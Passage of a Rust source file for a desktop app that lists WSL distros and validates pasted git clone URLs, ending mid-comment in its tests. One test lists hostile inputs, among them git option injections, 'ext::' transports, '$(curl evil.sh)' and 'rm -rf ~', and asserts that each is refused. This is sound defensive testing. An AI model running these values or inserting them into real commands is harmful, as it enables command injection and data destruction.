//! Opening a project from somewhere other than the native folder dialog:
//! a folder inside a WSL distro, or a git repository cloned from a URL into
//! `~/openleash/<repo>` (the visible projects folder, not the hidden data dir
//! `~/.openleash`).
//!
//! WSL needs no special project type: a `\\wsl.localhost\<distro>\...` folder
//! already routes commands and git into the distro (`shell::wsl_target`). All
//! this adds is the list of distros and a sensible place to start browsing.
//!
//! Cloning runs `git` on a string the user pasted, so the URL is held to a
//! deliberately narrow grammar before it gets anywhere near a process — see
//! `normalize_clone_url`.

use serde::Serialize;
use std::path::{Path, PathBuf};
use std::time::Duration;

/// Generous: a large monorepo over a slow link takes many minutes, and the
/// user can see "Cloning…" the whole time. It only exists so a clone stuck on
/// a dead connection cannot hold a `git` process forever.
const CLONE_TIMEOUT: Duration = Duration::from_secs(30 * 60);

// ───────── WSL ─────────

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct WslDistro {
    pub name: String,
    /// `\\wsl.localhost\<name>` — the distro's `/`.
    pub root: String,
}

/// Decode what `wsl.exe` printed. It writes UTF-16LE unless `WSL_UTF8=1` is
/// honoured (older builds ignore it), sometimes with a BOM, so both are
/// accepted rather than trusting the environment variable.
fn decode_wsl_output(raw: &[u8]) -> String {
    let bom16 = raw.starts_with(&[0xFF, 0xFE]);
    // ASCII text in UTF-16LE has a NUL in every odd byte.
    let odd_nuls = raw.iter().skip(1).step_by(2).filter(|b| **b == 0).count();
    let utf16 = bom16 || (raw.len() >= 2 && odd_nuls * 2 >= raw.len() / 2);
    let text = if utf16 {
        let body = if bom16 { &raw[2..] } else { raw };
        let units: Vec<u16> = body
            .as_chunks::<2>()
            .0
            .iter()
            .map(|c| u16::from_le_bytes(*c))
            .collect();
        String::from_utf16_lossy(&units)
    } else {
        String::from_utf8_lossy(raw).into_owned()
    };
    text.replace(['\0', '\u{feff}'], "")
}

/// WSL's own rule for distro names. Anything else in the output is a message
/// (e.g. "no installed distributions"), not a name — and a name is spliced into
/// a UNC path and passed to `wsl.exe -d`, so `..` or a leading `-` must not pass.
fn valid_distro_name(n: &str) -> bool {
    !n.is_empty()
        && n.len() <= 64
        && !n.starts_with('-')
        && !n.chars().all(|c| c == '.')
        && n.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

/// Distro names from `wsl.exe -l -q` output, in the order WSL lists them
/// (the default first). Docker Desktop's internal distros are left out: they
/// have no user shell, so there is nothing there to open as a project.
pub fn parse_distros(raw: &[u8]) -> Vec<String> {
    let mut out: Vec<String> = vec![];
    for line in decode_wsl_output(raw).lines() {
        let name = line.trim();
        if !valid_distro_name(name) || name.to_ascii_lowercase().starts_with("docker-desktop") {
            continue;
        }
        if !out.iter().any(|n| n.eq_ignore_ascii_case(name)) {
            out.push(name.to_string());
        }
    }
    out
}

/// Run a short command with a deadline, returning (success, stdout). `wsl.exe`
/// can hang when the WSL service is wedged, and this is called from the folder
/// picker, which must not hang with it.
#[cfg(windows)]
fn run_quick(mut cmd: std::process::Command, limit: Duration) -> Option<(bool, Vec<u8>)> {
    use std::io::Read;
    use std::os::windows::process::CommandExt;
    use std::process::Stdio;
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .creation_flags(0x0800_0000);
    let mut child = cmd.spawn().ok()?;
    let mut stdout = child.stdout.take();
    // Read on a thread so a chatty child can't fill the pipe and deadlock the wait.
    let reader = std::thread::spawn(move || {
        let mut buf = vec![];
        if let Some(s) = stdout.as_mut() {
            let _ = s.read_to_end(&mut buf);
        }
        buf
    });
    let start = std::time::Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(status)) => return Some((status.success(), reader.join().unwrap_or_default())),
            Ok(None) if start.elapsed() < limit => std::thread::sleep(Duration::from_millis(20)),
            _ => {
                let _ = child.kill();
                let _ = child.wait();
                return None;
            }
        }
    }
}

/// Installed WSL distros. Empty when WSL isn't installed, has no distros, or
/// this isn't Windows. Listing does not boot a distro.
pub fn wsl_distros() -> Vec<String> {
    #[cfg(windows)]
    {
        let mut c = std::process::Command::new("wsl.exe");
        c.args(["-l", "-q"]).env("WSL_UTF8", "1");
        match run_quick(c, Duration::from_secs(10)) {
            // A failed listing prints an explanation, not names.
            Some((true, out)) => parse_distros(&out),
            _ => vec![],
        }
    }
    #[cfg(not(windows))]
    {
        vec![]
    }
}

/// `wsl_distros`, remembered for a minute. The remote folder picker lists the
/// distros as roots on every directory it opens, and a `wsl.exe` launch per
/// click is noticeable.
pub fn wsl_distros_cached() -> Vec<String> {
    use std::sync::Mutex;
    use std::time::Instant;
    static CACHE: Mutex<Option<(Instant, Vec<String>)>> = Mutex::new(None);
    let mut g = CACHE.lock().unwrap_or_else(|e| e.into_inner());
    if let Some((at, list)) = g.as_ref() {
        if at.elapsed() < Duration::from_secs(60) {
            return list.clone();
        }
    }
    let list = wsl_distros();
    *g = Some((Instant::now(), list.clone()));
    list
}

pub fn wsl_root(distro: &str) -> String {
    format!(r"\\wsl.localhost\{distro}")
}

/// Where to start browsing inside a distro: the one user's home when `/home`
/// holds exactly one, else `/home`, else `/`. Asking `whoami` would boot the
/// distro *and* run its login shell; reading `/home` is what the folder
/// dialog is about to do anyway.
pub fn start_dir_in(root: &Path) -> PathBuf {
    let home = root.join("home");
    let users: Vec<PathBuf> = std::fs::read_dir(&home)
        .map(|rd| {
            rd.flatten()
                .filter(|e| e.file_type().map(|t| t.is_dir()).unwrap_or(false))
                .filter(|e| !e.file_name().to_string_lossy().starts_with('.'))
                .map(|e| e.path())
                .collect()
        })
        .unwrap_or_default();
    match users.as_slice() {
        [one] => one.clone(),
        _ if home.is_dir() => home,
        _ => root.to_path_buf(),
    }
}

#[tauri::command]
pub async fn wsl_list() -> Vec<WslDistro> {
    tokio::task::spawn_blocking(wsl_distros_cached)
        .await
        .unwrap_or_default()
        .into_iter()
        .map(|name| WslDistro {
            root: wsl_root(&name),
            name,
        })
        .collect()
}

/// The folder to open the dialog at for one distro. Only a distro WSL itself
/// lists is accepted, so this can't be turned into "probe any UNC path".
#[tauri::command]
pub async fn wsl_start_dir(distro: String) -> Result<String, String> {
    tokio::task::spawn_blocking(move || {
        if !wsl_distros_cached().iter().any(|d| d == &distro) {
            return Err(format!("There's no WSL distro called {distro}."));
        }
        let mut root = PathBuf::from(wsl_root(&distro));
        // Windows 10 before 21H2 only serves the older `\\wsl$` name.
        if !root.is_dir() {
            let legacy = PathBuf::from(format!(r"\\wsl$\{distro}"));
            if legacy.is_dir() {
                root = legacy;
            }
        }
        Ok(start_dir_in(&root).to_string_lossy().into_owned())
    })
    .await
    .map_err(|e| e.to_string())?
}

// ───────── Clone from a URL ─────────

/// Characters no supported clone URL needs. `git` is never run through a
/// shell, so these are not an injection path today; refusing them keeps it
/// that way if this string is ever logged into a command line, and makes a
/// pasted `foo; rm -rf ~` fail loudly instead of becoming a weird folder name.
const FORBIDDEN: &[char] = &[
    '`', '$', ';', '&', '|', '<', '>', '"', '\'', '\\', '(', ')', '{', '}', '[', ']', '^', '*',
    '!', ',',
];

const BAD_URL: &str = "That doesn't look like a repository URL. Paste an https:// link (e.g. https://github.com/owner/repo), an ssh:// URL, or git@host:owner/repo.";

fn valid_host(h: &str) -> bool {
    !h.is_empty()
        && h.len() <= 253
        && h.split('.').all(|l| {
            !l.is_empty()
                && !l.starts_with('-')
                && !l.ends_with('-')
                && l.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
        })
}

fn valid_user(u: &str) -> bool {
    !u.is_empty()
        && u.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
        && u.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '~' | '%' | '+' | ':')
        })
}

/// A repository path: something to clone, no `..` climbing, and no segment
/// that a tool further down could read as an option.
fn valid_repo_path(p: &str) -> bool {
    let segs: Vec<&str> = p.split('/').filter(|s| !s.is_empty()).collect();
    !segs.is_empty()
        && segs.iter().all(|s| {
            *s != ".."
                && *s != "."
                && !s.starts_with('-')
                && s.chars().all(|c| {
                    c.is_ascii_alphanumeric()
                        || matches!(c, '-' | '.' | '_' | '~' | '%' | '+' | '@' | ':' | '=')
                })
        })
}

/// Turn whatever the user pasted into a URL safe to hand to `git clone --`.
///
/// Accepted: `https://` / `http://` / `ssh://` / `git://` URLs, scp-style
/// `user@host:owner/repo`, and a bare `github.com/owner/repo` (read as https).
/// GitHub web links into a repo (`/tree/main/src`, `/blob/...`, `?tab=...`)
/// are cut back to the repo itself, as are GitLab's `/-/...` pages.
///
/// Refused, on purpose: anything starting with `-` (git would read it as an
/// option such as `--upload-pack=`), whitespace and control characters,
/// `file:` and local paths (this is "clone from the internet", and a local
/// path clone is an easy way to copy something unexpected), and git's
/// `<transport>::<address>` remote-helper syntax — `ext::` runs an arbitrary
/// command by design.
///
/// A trailing `.git` is kept: some servers need it, and git strips it itself
/// where it doesn't matter. The folder name drops it (`repo_name`).
pub fn normalize_clone_url(input: &str) -> Result<String, String> {
    let s = input.trim();
    if s.is_empty() {
        return Err("Paste a repository URL.".into());
    }
    if s.starts_with('-') {
        return Err(BAD_URL.into());
    }
    if s.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err("A repository URL can't contain spaces.".into());
    }
    if !s.is_ascii() || s.contains(FORBIDDEN) || s.contains("::") {
        return Err(BAD_URL.into());
    }
    let lower = s.to_ascii_lowercase();
    if let Some(i) = lower.find("://") {
        let scheme = &lower[..i];
        if !matches!(scheme, "https" | "http" | "ssh" | "git") {
            return Err(format!(
                "{scheme}:// isn't supported here. Use an https:// or ssh:// URL, or git@host:owner/repo."
            ));
        }
        let web = scheme == "https" || scheme == "http";
        let rest = &s[i + 3..];
        let (authority, mut path) = match rest.find('/') {
            Some(j) => (&rest[..j], &rest[j..]),
            None => return Err("The URL needs the repository's path, like host/owner/repo.".into()),
        };
        let host_port = match authority.rfind('@') {
            Some(at) => {
                if !valid_user(&authority[..at]) {
                    return Err(BAD_URL.into());
                }
                &authority[at + 1..]
            }
            None => authority,
        };
        let host = match host_port.split_once(':') {
            Some((h, port)) => {
                if port.is_empty() || !port.chars().all(|c| c.is_ascii_digit()) {
                    return Err(BAD_URL.into());
                }
                h
            }
            None => host_port,
        };
        if !valid_host(host) {
            return Err(BAD_URL.into());
        }
        if web {
            // A page on the repo's site, not a different repository.
            if let Some(q) = path.find(['?', '#']) {
                path = &path[..q];
            }
            if let Some(g) = path.find("/-/") {
                path = &path[..g];
            }
        } else if path.contains(['?', '#']) {
            return Err(BAD_URL.into());
        }
        let mut path = path.trim_end_matches('/').to_string();
        let h = host.to_ascii_lowercase();
        if web && (h == "github.com" || h == "www.github.com") {
            let segs: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
            if segs.len() < 2 {
                return Err(
                    "A GitHub link needs both the owner and the repository: github.com/owner/repo."
                        .into(),
                );
            }
            path = format!("/{}/{}", segs[0], segs[1]);
        }
        if !valid_repo_path(&path) {
            return Err(BAD_URL.into());
        }
        return Ok(format!("{scheme}://{authority}{path}"));
    }
    // scp-style `user@host:path`: git reads it that way only when no `/`
    // comes before the first `:`. The user part is required, which is what
    // keeps a Windows `C:/x` from being mistaken for a host called `C`.
    if let (Some(at), Some(colon)) = (s.find('@'), s.find(':')) {
        if at < colon && !s[..colon].contains('/') {
            let (user, host, path) = (&s[..at], &s[at + 1..colon], &s[colon + 1..]);
            let path = path.trim_end_matches('/');
            if !valid_user(user)
                || user.contains(':')
                || !valid_host(host)
                || path.starts_with('-')
                || !valid_repo_path(path)
            {
                return Err(BAD_URL.into());
            }
            return Ok(format!("{user}@{host}:{path}"));
        }
    }
    // A bare `github.com/owner/repo`. The first segment has to be a real
    // hostname with a dot in it, so `./x`, `~/x`, `/x` and `C:/x` all fail.
    if let Some((host, _)) = s.split_once('/') {
        if host.contains('.') && valid_host(host) {
            return normalize_clone_url(&format!("https://{s}"));
        }
    }
    Err(BAD_URL.into())
}

/// The path part of an already-normalised clone URL.
fn url_path(url: &str) -> &str {
    if let Some(i) = url.find("://") {
        let rest = &url[i + 3..];
        return rest.find('/').map(|j| &rest[j..]).unwrap_or("");
    }
    url.split_once(':').map(|(_, p)| p).unwrap_or(url)
}

/// Windows refuses these as file names, with or without an extension.
const RESERVED: &[&str] = &[
    "CON", "PRN", "AUX", "NUL", "COM0", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7",
    "COM8", "COM9", "LPT0", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
];

/// A folder name that is one plain path component on every platform: no
/// separators, no `.`/`..`, no hidden dot-name, no trailing dot (Windows drops
/// it), and no device name.
pub fn sanitize_name(raw: &str) -> Option<String> {
    let mapped: String = raw
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.') {
                c
            } else {
                '-'
            }
        })
        .collect();
    let mut s: String = mapped
        .trim_matches(|c| c == '.' || c == '-')
        .chars()
        .take(80)
        .collect();
    s = s.trim_end_matches(['.', '-']).to_string();
    if s.is_empty() {
        return None;
    }
    let stem_end = s.find('.').unwrap_or(s.len());
    if RESERVED.contains(&s[..stem_end].to_ascii_uppercase().as_str()) {
        s.insert_str(stem_end, "-repo");
    }
    Some(s)
}

/// The folder a clone of this (normalised) URL is named after.
pub fn repo_name(url: &str) -> Result<String, String> {
    let path = url_path(url).trim_end_matches('/');
    let last = path.rsplit('/').next().unwrap_or("");
    let last = if last.to_ascii_lowercase().ends_with(".git") {
        &last[..last.len() - 4]
    } else {
        last
    };
    sanitize_name(last).ok_or_else(|| "Couldn't work out a folder name from that URL.".into())
}

/// One repository however it was spelled: `git@github.com:o/r`,
/// `ssh://git@github.com/o/r.git` and `https://github.com/o/r/` are the same.
///
/// An explicit port is part of the key (`host:8080/x` and `host:8081/x` can be
/// different servers, and treating them as one would reopen a checkout of the
/// wrong repository); only the scheme's default port is dropped.
pub fn remote_key(url: &str) -> String {
    let u = url.trim().to_ascii_lowercase();
    let hostpath = match u.find("://") {
        Some(i) => {
            let scheme = &u[..i];
            let rest = &u[i + 3..];
            let (auth, path) = rest.split_at(rest.find('/').unwrap_or(rest.len()));
            let hp = auth.rsplit('@').next().unwrap_or(auth);
            // The port colon comes after an IPv6 literal's `]`, if any.
            let colon = match hp.rfind(']') {
                Some(b) => hp[b..].find(':').map(|c| b + c),
                None => hp.find(':'),
            };
            let (host, port) = match colon {
                Some(c) => (&hp[..c], &hp[c + 1..]),
                None => (hp, ""),
            };
            let default = matches!(
                (scheme, port),
                (_, "")
                    | ("https", "443")
                    | ("http", "80")
                    | ("ssh" | "git+ssh" | "ssh+git", "22")
                    | ("git", "9418")
            );
            if default {
                format!("{host}{path}")
            } else {
                format!("{host}:{port}{path}")
            }
        }
        None => {
            let after = u.split_once('@').map(|(_, r)| r).unwrap_or(&u);
            after.replacen(':', "/", 1)
        }
    };
    let mut k = hostpath.replace("//", "/");
    k = k.trim_end_matches('/').to_string();
    if let Some(stripped) = k.strip_suffix(".git") {
        k = stripped.to_string();
    }
    k.trim_end_matches('/')
        .trim_start_matches("www.")
        .to_string()
}

pub fn same_remote(a: &str, b: &str) -> bool {
    remote_key(a) == remote_key(b)
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Dest {
    /// Already cloned from this URL: open it rather than clone again.
    Existing(PathBuf),
    /// Nothing there yet.
    Fresh(PathBuf),
}

/// Where a clone named `name` goes inside `base`: `name`, else `name-2`, `-3`…
/// A folder that is already a checkout of the same repository is reused, so
/// cloning the same link twice reopens it instead of piling up copies; any
/// other folder in the way is left strictly alone.
pub fn choose_dest(
    base: &Path,
    name: &str,
    url: &str,
    origin_of: impl Fn(&Path) -> Option<String>,
) -> Result<Dest, String> {
    for n in 1..=99 {
        let cand = if n == 1 {
            base.join(name)
        } else {
            base.join(format!("{name}-{n}"))
        };
        // `symlink_metadata`, so a dangling link still counts as taken.
        if std::fs::symlink_metadata(&cand).is_err() {
            return Ok(Dest::Fresh(cand));
        }
        // Only a checkout rooted *here*: a plain folder inside some other repo
        // would otherwise answer with its parent's origin. Both the folder and
        // its `.git` must be real directories, not symlinks or junctions:
        // `exists()` follows links, so a link planted in the clone folder
        // would hand "reopen" a checkout that lives somewhere else entirely.
        if real_dir(&cand)
            && real_dir(&cand.join(".git"))
            && origin_of(&cand).is_some_and(|o| same_remote(&o, url))
        {
            return Ok(Dest::Existing(cand));
        }
    }
    Err(format!(
        "Too many folders called {name} in {} already.",
        base.display()
    ))
}

/// A directory itself, not a link to one. On Windows a junction is a
/// name-surrogate reparse point, which std reports as a symlink too.
fn real_dir(p: &Path) -> bool {
    std::fs::symlink_metadata(p).is_ok_and(|m| m.is_dir() && !m.file_type().is_symlink())
}

/// `~/openleash` (`%USERPROFILE%\openleash` on Windows).
pub fn clone_base() -> Result<PathBuf, String> {
    dirs::home_dir()
        .map(|h| h.join("openleash"))
        .ok_or_else(|| "Couldn't find your home folder.".into())
}

fn origin(p: &Path) -> Option<String> {
    super::git::remote_url(&p.to_string_lossy())
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct ClonePlan {
    /// The URL that will actually be cloned.
    pub url: String,
    pub name: String,
    pub dest: String,
    /// `dest` is already a checkout of this repository; cloning opens it.
    pub existing: bool,
}

pub fn plan_in(base: &Path, input: &str) -> Result<ClonePlan, String> {
    let url = normalize_clone_url(input)?;
    let name = repo_name(&url)?;
    let (dest, existing) = match choose_dest(base, &name, &url, origin)? {
        Dest::Existing(p) => (p, true),
        Dest::Fresh(p) => (p, false),
    };
    Ok(ClonePlan {
        url,
        name,
        dest: dest.to_string_lossy().into_owned(),
        existing,
    })
}

/// git's complaint, without its "Cloning into '…'" preamble, capped.
fn clone_error(stderr: &[u8]) -> String {
    let text = String::from_utf8_lossy(stderr);
    let msg: Vec<&str> = text
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with("Cloning into"))
        .collect();
    let msg = msg.join("\n");
    let msg: String = msg.chars().take(1500).collect();
    if msg.is_empty() {
        "git clone failed.".into()
    } else {
        msg
    }
}

async fn run_clone(url: &str, dest: &Path, cwd: &Path) -> Result<(), String> {
    let mut c = tokio::process::Command::new("git");
    // `ext::` and `file://` are refused by the parser already; these make git
    // refuse them too, so a redirect or a future parser change can't reopen it.
    c.args([
        "-c",
        "protocol.ext.allow=never",
        "-c",
        "protocol.file.allow=never",
        "clone",
        "--",
    ])
    .arg(url)
    .arg(dest)
    // Not the app's working directory: nothing about wherever OpenLeash was
    // launched from should feed into the clone.
    .current_dir(cwd)
    .env("GIT_TERMINAL_PROMPT", "0")
    .stdin(std::process::Stdio::null())
    .stdout(std::process::Stdio::null())
    .stderr(std::process::Stdio::piped())
    .kill_on_drop(true);
    #[cfg(windows)]
    c.creation_flags(0x0800_0000);
    let out = match tokio::time::timeout(CLONE_TIMEOUT, c.output()).await {
        Ok(Ok(out)) => out,
        Ok(Err(e)) => return Err(format!("git isn't available: {e}")),
        Err(_) => return Err("The clone took too long and was stopped.".into()),
    };
    if out.status.success() {
        Ok(())
    } else {
        Err(clone_error(&out.stderr))
    }
}

/// Clone `input` into `base` and return the checkout's path. Exposed with an
/// explicit base so tests never touch the real home folder.
pub async fn clone_into_base(base: &Path, input: &str) -> Result<String, String> {
    let url = normalize_clone_url(input)?;
    let name = repo_name(&url)?;
    std::fs::create_dir_all(base)
        .map_err(|e| format!("Couldn't create {}: {e}", base.display()))?;
    // A few rounds, for the case of two clones racing for the same name: the
    // `create_dir` below is the atomic claim, and the loser moves to `-2`.
    for _ in 0..5 {
        let (b, n, u) = (base.to_path_buf(), name.clone(), url.clone());
        let dest = tokio::task::spawn_blocking(move || choose_dest(&b, &n, &u, origin))
            .await
            .map_err(|e| e.to_string())??;
        let dest = match dest {
            Dest::Existing(p) => return Ok(p.to_string_lossy().into_owned()),
            Dest::Fresh(p) => p,
        };
        match std::fs::create_dir(&dest) {
            Ok(()) => {}
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
            Err(e) => return Err(format!("Couldn't create {}: {e}", dest.display())),
        }
        // From here `dest` is ours, and only ours: a failed clone removes it,
        // and nothing else is ever deleted.
        return match run_clone(&url, &dest, base).await {
            Ok(()) => Ok(dest.to_string_lossy().into_owned()),
            Err(e) => {
                let _ = std::fs::remove_dir_all(&dest);
                Err(e)
            }
        };
    }
    Err("Couldn't pick a folder for the clone.".into())
}

/// What a clone of this URL would do, for the dialog's live preview.
#[tauri::command]
pub async fn clone_preview(url: String) -> Result<ClonePlan, String> {
    tokio::task::spawn_blocking(move || plan_in(&clone_base()?, &url))
        .await
        .map_err(|e| e.to_string())?
}

/// Clone a repository into `~/openleash/<name>` and return its path. The UI
/// then opens it like any other folder, so trust is asked about as usual.
#[tauri::command]
pub async fn clone_repo(url: String) -> Result<String, String> {
    clone_into_base(&clone_base()?, &url).await
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp(tag: &str) -> PathBuf {
        let d =
            std::env::temp_dir().join(format!("ol-proj-{tag}-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn distros_parse_utf16_utf8_and_skip_noise() {
        let utf16: Vec<u8> = [0xFFu8, 0xFE]
            .into_iter()
            .chain(
                "Ubuntu\r\ndocker-desktop\r\nDebian\r\n\r\n"
                    .encode_utf16()
                    .flat_map(|u| u.to_le_bytes()),
            )
            .collect();
        assert_eq!(parse_distros(&utf16), ["Ubuntu", "Debian"]);
        // No BOM, still UTF-16.
        let bare: Vec<u8> = "Arch\r\n"
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        assert_eq!(parse_distros(&bare), ["Arch"]);
        assert_eq!(
            parse_distros(b"Ubuntu-22.04\r\nsalad-linux\n"),
            ["Ubuntu-22.04", "salad-linux"]
        );
        // A failed listing is a sentence, and hostile names never pass.
        assert!(
            parse_distros(b"Windows Subsystem for Linux has no installed distributions.")
                .is_empty()
        );
        assert!(parse_distros(b"..\n-d\nfoo\\bar\nx y\n").is_empty());
        assert!(parse_distros(b"").is_empty());
    }

    #[test]
    fn start_dir_prefers_the_single_user_home() {
        let root = tmp("wsl");
        assert_eq!(start_dir_in(&root), root);
        std::fs::create_dir_all(root.join("home/alice")).unwrap();
        assert_eq!(start_dir_in(&root), root.join("home").join("alice"));
        std::fs::create_dir_all(root.join("home/bob")).unwrap();
        assert_eq!(start_dir_in(&root), root.join("home"));
        std::fs::remove_dir_all(&root).ok();
    }

    #[test]
    fn clone_urls_normalise() {
        let ok = |i: &str| normalize_clone_url(i).unwrap();
        assert_eq!(ok("  https://github.com/o/r  "), "https://github.com/o/r");
        assert_eq!(
            ok("https://github.com/o/r.git"),
            "https://github.com/o/r.git"
        );
        assert_eq!(ok("https://github.com/o/r/"), "https://github.com/o/r");
        assert_eq!(
            ok("https://github.com/o/r/tree/main/src"),
            "https://github.com/o/r"
        );
        assert_eq!(
            ok("https://github.com/o/r/blob/main/README.md#L3"),
            "https://github.com/o/r"
        );
        assert_eq!(
            ok("https://github.com/o/r?tab=readme-ov-file"),
            "https://github.com/o/r"
        );
        assert_eq!(ok("github.com/o/r"), "https://github.com/o/r");
        assert_eq!(ok("gitlab.com/g/sub/r"), "https://gitlab.com/g/sub/r");
        assert_eq!(
            ok("https://gitlab.com/g/r/-/tree/main"),
            "https://gitlab.com/g/r"
        );
        assert_eq!(
            ok("http://git.example.com:8080/r.git"),
            "http://git.example.com:8080/r.git"
        );
        assert_eq!(
            ok("ssh://git@github.com/o/r.git"),
            "ssh://git@github.com/o/r.git"
        );
        assert_eq!(ok("ssh://me@box:2222/~/src/r"), "ssh://me@box:2222/~/src/r");
        assert_eq!(ok("git@github.com:o/r.git"), "git@github.com:o/r.git");
        assert_eq!(ok("git@github.com:o/r/"), "git@github.com:o/r");
        assert_eq!(
            ok("https://user:tok@github.com/o/r"),
            "https://user:tok@github.com/o/r"
        );
    }

    /// The string ends up as an argument to `git`. Every one of these has to be
    /// refused before a process is ever spawned.
    #[test]
    fn hostile_clone_inputs_are_refused() {
        for bad in [
            "",
            "   ",
            "--upload-pack=touch /tmp/pwned",
            "--upload-pack=calc.exe",
            "-c",
            "-cprotocol.ext.allow=always",
            "-ohttps://github.com/o/r",
            "ext::sh -c touch% /tmp/pwned",
            "ext::calc",
            "fd::3",
            "file:///etc",
            "file:///C:/Users",
            "file:/etc",
            "C:\\x",
            "C:\\Users\\me\\repo",
            "C:/x",
            "c:x",
            "/home/me/repo",
            "./repo",
            "../repo",
            "~/repo",
            "\\\\server\\share\\repo",
            "https://github.com/o/$(touch x)",
            "$(curl evil.sh)",
            "https://github.com/o/`id`",
            "`id`",
            "https://github.com/o/r;rm -rf ~",
            "https://github.com/o/r;id",
            "https://github.com/o/r&&id",
            "https://github.com/o/r|id",
            "https://github.com/o/r>x",
            "https://github.com/o r",
            "https://github.com/o/r\nid",
            "https://github.com/o/r\tx",
            "https://-oProxyCommand=calc/x",
            "ssh://-oProxyCommand=calc/x",
            "ssh://git@-oProxyCommand=calc/x",
            "git@-oProxyCommand=calc:o/r",
            "-git@github.com:o/r",
            "git@github.com:-o/r",
            "git@github.com:--upload-pack=x",
            "https://github.com/-o/r",
            "https://github.com/o/../../r",
            "https://github.com",
            "https://github.com/",
            "https://github.com/o",
            "ftp://example.com/r",
            "javascript://x/y",
            "https://ex%41mple.com/r",
            "https://exämple.com/r",
            "https://[::1]/r",
            "https://example.com:x/r",
            "ssh://host/r#frag",
            "github.com",
            "localhost/r",
        ] {
            assert!(normalize_clone_url(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn folder_names_are_one_safe_component() {
        let n = |u: &str| repo_name(&normalize_clone_url(u).unwrap()).unwrap();
        assert_eq!(n("https://github.com/o/OpenLeash.git"), "OpenLeash");
        assert_eq!(n("https://github.com/o/r/tree/main"), "r");
        assert_eq!(n("git@github.com:o/my.repo.GIT"), "my.repo");
        assert_eq!(n("ssh://me@box/~/src/tool"), "tool");
        assert_eq!(n("https://example.com/a/con"), "con-repo");
        assert_eq!(n("https://example.com/a/NUL.git"), "NUL-repo");
        assert_eq!(n("https://example.com/a/com1.txt"), "com1-repo.txt");
        assert_eq!(n("https://example.com/a/.hidden"), "hidden");
        assert_eq!(n("https://example.com/a/my%20repo"), "my-20repo");
        assert_eq!(sanitize_name(".."), None);
        assert_eq!(sanitize_name("."), None);
        assert_eq!(sanitize_name(".git"), Some("git".into()));
        assert_eq!(sanitize_name("a/b\\c:d"), Some("a-b-c-d".into()));
        assert_eq!(sanitize_name("trailing..."), Some("trailing".into()));
        assert_eq!(sanitize_name(&"x".repeat(300)).unwrap().len(), 80);
        // `.git` alone has no name left once the suffix goes.
        assert!(repo_name("https://example.com/a/.git").is_err());
    }

    #[test]
    fn remotes_match_across_spellings() {
        assert!(same_remote(
            "git@github.com:o/r.git",
            "https://github.com/o/r"
        ));
        assert!(same_remote(
            "ssh://git@github.com/o/r",
            "https://GitHub.com/o/r/"
        ));
        assert!(same_remote(
            "https://www.github.com/o/r",
            "https://github.com/o/r.git"
        ));
        assert!(!same_remote(
            "https://github.com/o/r",
            "https://github.com/o/r2"
        ));
        assert!(!same_remote(
            "https://github.com/o/r",
            "https://gitlab.com/o/r"
        ));
    }

    #[test]
    fn destinations_reuse_a_matching_checkout_and_skip_others() {
        let base = tmp("dest");
        let url = "https://github.com/o/r";
        let none = |_: &Path| None::<String>;
        // Base folder doesn't even exist yet: still fine.
        let missing = base.join("nope");
        assert_eq!(
            choose_dest(&missing, "r", url, none).unwrap(),
            Dest::Fresh(missing.join("r"))
        );
        assert_eq!(
            choose_dest(&base, "r", url, none).unwrap(),
            Dest::Fresh(base.join("r"))
        );
        // A plain folder in the way is skipped, never reused.
        std::fs::create_dir_all(base.join("r")).unwrap();
        assert_eq!(
            choose_dest(&base, "r", url, none).unwrap(),
            Dest::Fresh(base.join("r-2"))
        );
        // A checkout of something else is skipped too.
        std::fs::create_dir_all(base.join("r-2/.git")).unwrap();
        let other = |_: &Path| Some("https://github.com/x/y".to_string());
        assert_eq!(
            choose_dest(&base, "r", url, other).unwrap(),
            Dest::Fresh(base.join("r-3"))
        );
        // A checkout of the same repo (however spelled) is reopened.
        let same = |p: &Path| {
            p.ends_with("r-2")
                .then(|| "git@github.com:o/r.git".to_string())
        };
        assert_eq!(
            choose_dest(&base, "r", url, same).unwrap(),
            Dest::Existing(base.join("r-2"))
        );
        // A plain folder isn't asked about its origin at all.
        let lying = |_: &Path| Some(url.to_string());
        assert_eq!(
            choose_dest(&base, "r", url, lying).unwrap(),
            Dest::Existing(base.join("r-2"))
        );
        std::fs::remove_dir_all(&base).ok();
    }

    #[test]
    fn remote_keys_keep_explicit_ports() {
        assert!(!same_remote("https://host:8080/x", "https://host:8081/x"));
        assert!(!same_remote("https://host:8080/x", "https://host/x"));
        assert!(!same_remote("ssh://git@host:2222/o/r", "git@host:o/r"));
        assert!(same_remote(
            "https://host:8080/x.git",
            "HTTPS://Host:8080/x/"
        ));
        // Default ports are the same server.
        assert!(same_remote("https://host:443/o/r", "https://host/o/r"));
        assert!(same_remote("ssh://git@host:22/o/r.git", "git@host:o/r"));
        assert!(same_remote("http://host:80/o/r", "http://host/o/r"));
        // IPv6 literals keep their colons; only the port after `]` counts.
        assert_eq!(
            remote_key("ssh://me@[fe80::1]:2222/o/r"),
            "[fe80::1]:2222/o/r"
        );
        assert_eq!(remote_key("ssh://me@[fe80::1]/o/r"), "[fe80::1]/o/r");
        assert!(same_remote("ssh://[fe80::1]:22/o/r", "ssh://[fe80::1]/o/r"));
    }

    /// A link (symlink, or junction on Windows) to `target` at `link`.
    /// `false` when this system won't let the test create one.
